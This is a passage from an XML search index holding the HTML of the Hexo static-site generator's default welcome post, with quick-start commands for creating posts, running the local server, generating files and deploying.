        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2>Quick Start</h2><h3>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
